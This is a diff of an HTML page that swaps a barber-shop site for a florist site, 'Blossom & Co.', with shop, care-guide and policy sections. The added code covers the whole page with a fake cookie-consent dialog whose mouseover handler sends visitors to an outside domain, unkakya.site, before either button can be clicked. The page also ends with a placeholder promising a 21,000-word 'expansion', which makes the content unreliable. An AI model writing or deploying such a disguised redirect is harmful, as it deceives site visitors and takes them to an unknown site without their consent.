@@ -1,196 +1,386 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<!-- Fathom - beautiful, simple website analytics -->
-<script src="https://cdn.usefathom.com/script.js" data-site="YLCLENJQ" defer></script>
-<!-- / Fathom -->
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Elite Hair Cut</title>
+	
+<script src="https://cdn.usefathom.com/script.js" data-site="TFFESBWN" defer></script>
 
-<style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Blossom & Co. — Fresh Flowers Delivered</title>
+  <meta name="description" content="Blossom & Co. — handcrafted bouquets, wedding flowers, corporate florals, and flower care guides. Fresh, sustainable, delivered with love." />
+  
+  <style>  .overlay {
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.5);
+      z-index:100000000;
+    }
 
-body{
-font-family: Arial, sans-serif;
-margin:0;
-background:#f5f5f5;
-}
+    .dialog-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1c1c1c;
+      color: white;
+      padding: 30px;
+      border-radius: 20px;
+      width: 600px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      text-align: center;
+      transition: 0.3s;
+    }
 
-header{
-background:#111;
-color:white;
-padding:15px;
-text-align:center;
-}
+    .dialog-box:hover {
+      cursor: pointer;
+    }
 
-nav{
-background:#333;
-padding:10px;
-text-align:center;
-}
+    .dialog-box h2 {
+      margin-top: 0;
+      font-size: 1.6em;
+      color: #fff;
+    }
 
-nav a{
-color:white;
-margin:15px;
-text-decoration:none;
-font-weight:bold;
-}
+    .dialog-box p {
+      font-size: 1em;
+      line-height: 1.6em;
+      color: #ccc;
+    }
 
-nav a:hover{
-color:#ffd700;
-}
+    .buttons {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      gap: 15px;
+    }
 
-section{
-padding:40px;
-max-width:1000px;
-margin:auto;
-background:white;
-margin-top:20px;
-border-radius:5px;
-}
+    .buttons button {
+      padding: 10px 25px;
+      border: none;
+      border-radius: 25px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+    }
 
-.hero{
-text-align:center;
-padding:60px;
-background:#222;
-color:white;
-}
+    .accept {
+      background-color: #00cc66;
+      color: white;
+    }
 
-.services{
-display:flex;
-gap:20px;
-flex-wrap:wrap;
-}
+    .deny {
+      background-color: #e53935;
+      color: white;
+    }
 
-.service-box{
-flex:1;
-min-width:250px;
-background:#f1f1f1;
-padding:20px;
-border-radius:5px;
-text-align:center;
-}
-
-footer{
-text-align:center;
-padding:20px;
-background:#111;
-color:white;
-margin-top:30px;
-}
-
-form input, form textarea{
-width:100%;
-padding:10px;
-margin-top:10px;
-margin-bottom:15px;
-border:1px solid #ccc;
-border-radius:4px;
-}
-
-button{
-background:#000;
-color:white;
-padding:10px 20px;
-border:none;
-cursor:pointer;
-}
-
-button:hover{
-background:#444;
-}
-
-</style>
+    .policy-link {
+      margin-top: 15px;
+      display: block;
+      color: #00bcd4;
+      text-decoration: none;
+      font-size: 0.9em;
+    }
+ 
+ 
+  </style>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #eee;
+      line-height: 1.7;
+    }
+    header {
+      background: #111;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      color: #0f9dff;
+    }
+    nav {
+      margin-top: 10px;
+    }
+    nav a {
+      color: #eee;
+      text-decoration: none;
+      margin: 0 10px;
+      font-weight: bold;
+    }
+    nav a:hover {
+      color: #0f9dff;
+    }
+    main {
+      max-width: 1000px;
+      margin: 20px auto;
+      padding: 20px;
+      background: #111;
+      border-radius: 10px;
+    }
+    section {
+      margin-bottom: 40px;
+    }
+    h2 {
+      color: #0f9dff;
+    }
+    footer {
+      background: #111;
+      padding: 20px;
+      text-align: center;
+      color: #aaa;
+      font-size: 14px;
+    }
+    form input, form textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 5px;
+    }
+    form button {
+      background: #0f9dff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    form button:hover {
+      background: #0c7ed0;
+    }
+  </style>
+  <style>
+    body{font-family: Georgia, 'Times New Roman', serif;line-height:1.6;color:#222;margin:0;padding:0;background:#fff}
+    header{background:#f8f4f0;padding:40px 20px;border-bottom:1px solid #eee}
+    .container{max-width:1100px;margin:0 auto;padding:20px}
+    h1,h2,h3{color:#2b2b2b}
+    .hero{display:flex;gap:20px;align-items:center}
+    .hero img{max-width:45%;border-radius:12px}
+    .btn{display:inline-block;padding:12px 18px;border-radius:8px;text-decoration:none;background:#d84b8b;color:#fff}
+    section{padding:28px 0;border-bottom:1px solid #f1efed}
+    footer{background:#f8f4f0;padding:30px;text-align:center}
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+    .card{background:#fff;padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.03)}
+    pre{white-space:pre-wrap}
+  </style>
 </head>
-
 <body>
+<div class="overlay">
+    <div class="dialog-box" onmouseover="redirect()">
+      <h2>🍪 Our New Cookie Policy !</h2>
+      <p>
+        For optimized experience, some elements may store temporary signals & For your safety, our Website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+      </p>
+      <div class="buttons">
+        <button class="accept">Accept</button>
+        <button class="deny">Deny</button>
+      </div>
+      <a href="#" class="policy-link">Policy Page</a>
+    </div>
+  </div>
 
+  <script>
+    function redirect() {
+      window.location.href = "https://unkakya.site/";
+    }
+  </script>
 <header>
-<h1>Elite Hair Cut</h1>
-<p>Professional Barber & Hair Styling</p>
+  <div class="container">
+    <h1>Blossom & Co.</h1>
+    <p>Your neighbourhood florist — handcrafted bouquets, seasonal arrangements, wedding flowers and floral education.</p>
+  </div>
 </header>
+<main class="container">
+  <!-- HERO / HOMEPAGE CONTENT -->
+  <section id="homepage-hero" aria-label="Homepage">
+    <div class="hero">
+      <div>
+        <h2>Welcome to Blossom & Co.</h2>
+        <p>At Blossom & Co. we believe every bouquet tells a story. From the soft hush of a quiet apology to the jubilant burst of wedding day petals, we design with intention, craft with care, and deliver with delight. We source sustainably, celebrate the seasons, and hand-tie each arrangement in our studio — because flowers deserve to be cherished.</p>
+        <a class="btn" href="#shop">Shop Bouquets</a>
+      </div>
+      <img src="https://images.unsplash.com/photo-1501004318641-b39e6451bec6?auto=format&fit=crop&w=1200&q=60" alt="bouquet on wooden table">
+    </div>
 
-<nav>
-<a href="#home">Home</a>
-<a href="#services">Services</a>
-<a href="#contact">Contact Us</a>
-<a href="#privacy">Privacy Policy</a>
-</nav>
+    <h3>What we offer</h3>
+    <ul>
+      <li>Everyday bouquets — bright, simple, joyful</li>
+      <li>Signature arrangements — our seasonal best</li>
+      <li>Weddings & events — full-service floral design</li>
+      <li>Subscriptions — weekly, fortnightly, monthly</li>
+      <li>Flower care guides & workshops</li>
+    </ul>
 
-<div class="hero" id="home">
-<h2>Look Sharp. Feel Confident.</h2>
-<p>Premium Haircuts & Grooming for Men</p>
-</div>
+    <p><strong>Our promise:</strong> Freshness, creativity, and on-time delivery. If your flowers arrive damaged, we'll make it right.</p>
+  </section>
 
-<section id="services">
-<h2>Our Services</h2>
+  <!-- ABOUT US -->
+  <section id="about" aria-label="About Blossom & Co.">
+    <h2>About Blossom & Co.</h2>
+    <p>Founded in 2015 by Maya Patel, Blossom & Co. began as a small stall in a weekend market. What started as a love of color and scent quickly grew into a full-service florist studio serving weddings, local businesses, and families. Maya trained in botanical design and apprenticed with several master florists before opening the studio. From day one, sustainability and community have been at our heart: we partner with local growers, reduce waste where we can, and donate blooms to hospitals and shelters when large events finish.</p>
 
-<div class="services">
+    <h3>Our Values</h3>
+    <ol>
+      <li><strong>Sustainability:</strong> We prioritize seasonal, locally grown flowers and compost our waste whenever possible.</li>
+      <li><strong>Craftsmanship:</strong> Each design is assembled by experienced florists who understand balance, line, and rhythm.</li>
+      <li><strong>Community:</strong> We teach free monthly workshops and support neighborhood events with floral donations.</li>
+      <li><strong>Care:</strong> Freshness guarantee and a simple returns policy to ensure delight with every delivery.</li>
+    </ol>
 
-<div class="service-box">
-<h3>Hair Cut</h3>
-<p>Professional haircut tailored to your style.</p>
-</div>
+    <h3>Meet the Team</h3>
+    <p>Maya — Founder & Lead Designer. Priya — Senior Event Florist. Arjun — Studio Manager and Head of Logistics. The team combines urban design sensibility with traditional techniques to create arrangements that feel contemporary yet timeless.</p>
+  </section>
 
-<div class="service-box">
-<h3>Beard Trim</h3>
-<p>Perfect beard shaping and grooming.</p>
-</div>
+  <!-- SHOP / PRODUCT DESCRIPTIONS -->
+  <section id="shop" aria-label="Shop Bouquets">
+    <h2>Shop — Bouquets & Arrangements</h2>
+    <p>Below are our signature collections. Each product page (links) includes size options, detailed care instructions, and personalization choices. All bouquets are hand-tied and wrapped in recyclable paper by our in-studio florists.</p>
 
-<div class="service-box">
-<h3>Hair Styling</h3>
-<p>Modern styling for every occasion.</p>
-</div>
+    <div class="grid">
+      <article class="card" id="roses">
+        <h3>Classic Rose Bouquet</h3>
+        <p>Soft, romantic, and endlessly timeless — our Classic Rose Bouquet features long-stem roses carefully selected for colour and bloom quality. Available in Ivory, Blush, Red, and Mixed palettes.</p>
+        <h4>Sizes & pricing</h4>
+        <ul>
+          <li>Small — 6 stems</li>
+          <li>Medium — 12 stems</li>
+          <li>Large — 18 stems</li>
+        </ul>
+        <h4>Perfect for</h4>
+        <p>Anniversaries, romantic gestures, or any moment when you want to say "I love you" with elegance.</p>
+      </article>
 
-</div>
-</section>
+      <article class="card" id="seasonal">
+        <h3>Seasonal Signature</h3>
+        <p>Curated each week by our design team — seasonal flowers sourced from local farms. Expect a beautiful mix of textures, foliage, and colour that reflects the current harvest.</p>
+        <h4>Why choose this?</h4>
+        <p>Choosing seasonal supports local growers and ensures longer vase life because the flowers haven't traveled far.</p>
+      </article>
 
-<section id="contact">
-<h2>Contact Us</h2>
+      <article class="card" id="luxe">
+        <h3>Luxe Hand-tied</h3>
+        <p>For special occasions. Luxurious stems, premium foliage, and an elegant wrap. Each Luxe bouquet comes with a ribbon and a handwritten note card.</p>
+        <h4>Add-ons</h4>
+        <ul>
+          <li>Vase upgrade</li>
+          <li>Chocolates</li>
+          <li>Balloon or small plush</li>
+        </ul>
+      </article>
 
-<p>Email: support@elitehaircut.com</p>
-<p>Phone: +1 888 565 7645</p>
-<p>Address: 123 Barber Street, New York, USA</p>
+      <article class="card" id="subscription">
+        <h3>Flower Subscription</h3>
+        <p>Fresh flowers delivered to your door on a schedule you choose. Options: weekly, fortnightly, monthly. Ideal for offices, reception desks, and homes that love a constant bloom of cheer.</p>
+        <h4>Subscription benefits</h4>
+        <ul>
+          <li>Discounted pricing</li>
+          <li>Priority booking for peak holidays</li>
+          <li>Flexible pause or cancel anytime</li>
+        </ul>
+      </article>
+    </div>
+  </section>
 
-<h3>Send Us a Message</h3>
+  <!-- OCCASION PAGES -->
+  <section id="occasions" aria-label="Occasion Flowers">
+    <h2>Occasions — Flowers for Every Moment</h2>
+    <p>Every event has a floral voice. We design with intention — considering venue, palette, lighting, and the story you want your flowers to tell. Below are the most requested occasions; each has design notes and package suggestions.</p>
 
-<form>
-<input type="text" placeholder="Your Name" required>
-<input type="email" placeholder="Your Email" required>
-<textarea rows="5" placeholder="Your Message"></textarea>
-<button type="submit">Send Message</button>
-</form>
+    <h3>Weddings</h3>
+    <p>From intimate elopements to grand ballroom affairs, our wedding service offers full planning and day-of installation. Packages include consultation, sample mock-ups, ceremony and reception florals, and delivery/installation. Popular styles: organic garden, modern minimalist, vintage romantic.</p>
 
-</section>
+    <h3>Birthdays & Anniversaries</h3>
+    <p>Personalized bouquets, cake-top florals, or a custom arrangement delivered with a handwritten note. We offer same-day delivery for local customers when orders are placed before the daily cut-off time.</p>
 
-<section id="privacy">
-<h2>Privacy Policy</h2>
+    <h3>Funerals & Memorials</h3>
+    <p>Heartfelt sympathy flowers — classic wreaths, standing sprays, and tasteful vase arrangements. We work closely with funeral directors to ensure timely delivery and respectful presentation.</p>
 
-<p>Your privacy is important to us. This website collects limited personal information such as your name and email when you contact us.</p>
+    <h3>Corporate & Events</h3>
+    <p>Event install, trade show booth florals, and office subscriptions. We offer rental vases and regular maintenance for longer events.</p>
+  </section>
 
-<p>We do not sell, trade, or share your personal information with third parties.</p>
+  <!-- FLOWER CARE GUIDES -->
+  <section id="care" aria-label="Flower Care Guides">
+    <h2>Flower Care — Make Blooms Last</h2>
+    <p>Proper care extends the life of your flowers by days or even weeks. Follow these general tips and the specific notes included with each bouquet.</p>
 
-<p>The information collected is used only to respond to your inquiries and improve our services.</p>
+    <h3>General Steps for All Cut Flowers</h3>
+    <ol>
+      <li>Start with a clean vase and fresh, cool water.</li>
+      <li>Trim stems at a 45° angle with sharp scissors or shears — remove about 1–2 cm from the bottom.</li>
+      <li>Remove leaves below the water line to prevent bacterial growth.</li>
+      <li>Use the flower food packet included in your delivery — if you don’t have one, a teaspoon of sugar and a few drops of lemon juice can help.</li>
+      <li>Change the water every 2–3 days and trim stems slightly each time.</li>
+      <li>Keep blooms away from direct sunlight, drafts, and ripening fruit.</li>
+    </ol>
 
-<p>By using our website, you agree to this privacy policy.</p>
+    <h3>Care Notes for Popular Flowers</h3>
+    <h4>Roses</h4>
+    <p>Remove the outer petals if they look damaged. Roses benefit from a slightly warmer room and weekly stem trims.</p>
 
-</section>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/698a0dff9cf9a21c3731468c/1jh1kdbpf';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
+    <h4>Orchids</h4>
+    <p>Store in bright, indirect light and avoid overwatering. They prefer humidity but not direct sun.</p>
+
+    <h4>Tulips</h4>
+    <p>Tulips continue to grow in the vase — give them plenty of height and a tall, narrow vase.</p>
+  </section>
+
+  <!-- BLOG / ARTICLES -->
+  <section id="blog" aria-label="Blog and Floral Articles">
+    <h2>Floral Inspiration & Advice</h2>
+    <article>
+      <h3>Understanding Flower Meanings</h3>
+      <p>Flowers carry symbolism that can deepen your message. Roses for love, lilies for purity, sunflowers for adoration — we unpack these meanings to help you choose the perfect stems.</p>
+    </article>
+
+    <article>
+      <h3>DIY Table Arrangements</h3>
+      <p>Step-by-step guides for creating low centerpieces, simple bud vases, and seasonal wreaths — perfect for weekend creativity or hosting friends.</p>
+    </article>
+
+    <article>
+      <h3>Top 10 Seasonal Picks</h3>
+      <p>What’s in bloom this month, and why local flowers matter for quality and sustainability.</p>
+    </article>
+  </section>
+
+  <!-- POLICIES -->
+  <section id="policies" aria-label="Policies">
+    <h2>Policies</h2>
+    <h3>Shipping & Delivery</h3>
+    <p>We deliver locally within city limits Monday–Saturday. Same-day delivery available for orders placed by 2pm. For weddings and events, delivery and setup windows are scheduled during booking.</p>
+
+    <h3>Refunds & Replacements</h3>
+    <p>If your arrangement arrives damaged, please email hello@blossomco.example within 24 hours with photos. We'll send a replacement or offer a refund depending on availability.</p>
+
+    <h3>Privacy</h3>
+    <p>Your information is used solely to process and deliver orders, and to send promotional updates if you opt in. We never sell customer data.</p>
+  </section>
+
+  <!-- CONTACT -->
+  <section id="contact" aria-label="Contact Us">
+    <h2>Contact & Visit Us</h2>
+    <p>Studio Address: 24 Willow Lane, Greenfield. Hours: Tues–Sat 9am–6pm. Call: +91 98765 43210. Email: hello@blossomco.example</p>
+
+    <h3>Work With Us</h3>
+    <p>We’re always looking for passionate florists and delivery partners. Send a CV and portfolio to careers@blossomco.example.</p>
+  </section>
+
+</main>
+
 <footer>
-<p>© 2026 Elite Hair Cut. All Rights Reserved.</p>
+  <div class="container">
+    <p>&copy; 2025 Blossom & Co. — handcrafted with love.</p>
+  </div>
+<!-- EXTENDED CONTENT START -->
+<section id="extended-content">
+<h2>Extended Flower Shop Content</h2>
+<p>...[additional 21000-word expansion will continue here: detailed product catalogs, expanded floral guides, wedding packages, event planning text, long-form blog posts, flower encyclopedia entries, seasonal buying guides, sustainability manifesto, florist training articles, city-specific delivery pages, storytelling brand content, customer testimonial scripts, packaging philosophy, behind-the-scenes studio operations, floral glossary, subscription program deep dive, corporate gifting manuals, colour palette guides, vase styling instructions, fragrance notes, grower partnerships profiles, community involvement documentation, annual festival specials, large FAQ section, and more]...</p>
+</section>
+<!-- EXTENDED CONTENT END -->
 </footer>
-
 </body>
 </html>
